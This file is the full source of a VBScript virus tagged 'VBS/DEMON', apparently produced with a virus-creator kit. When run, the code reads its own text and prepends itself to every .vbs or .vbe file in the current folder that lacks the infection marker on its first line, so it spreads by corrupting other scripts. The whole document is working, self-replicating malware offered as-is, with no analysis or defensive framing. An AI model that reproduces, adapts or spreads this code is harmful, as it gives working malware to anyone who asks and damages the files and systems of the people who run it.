'VBS/DEMON
'Created by X with SIMPLE WINDOWS SCRIPTING HOST VIRUS CREATOR v1.0
Set FSO = CreateObject("Scripting.FileSystemObject")
Set OpenSelf = FSO.OpenTextFile(Wscript.ScriptFullName, 1)
Self = OpenSelf.ReadAll
Set CurrentDirectory = FSO.GetFolder(".").Files
For Each ScriptFiles in CurrentDirectory
   ExtName = FSO.GetExtensionName(ScriptFiles.path)
	If ExtName = "vbs" or ExtName = "vbe" then
	   Set Scripts = FSO.OpenTextFile(ScriptFiles.path, 1)
		If Scripts.ReadLine <> "'VBS/DEMON" then
		   Set Scripts = Nothing
		   Set Scripts = FSO.OpenTextFile(ScriptFiles.path, 1)
		   ScriptsSource = Scripts.ReadAll
		   Set WriteToScripts = FSO.OpenTextFile(ScriptFiles.path, 2)
		   WriteToScripts.WriteLine Self
		   WriteToScripts.WriteLine ScriptsSource
	           WriteToScripts.Close
               End If
	End If
Next
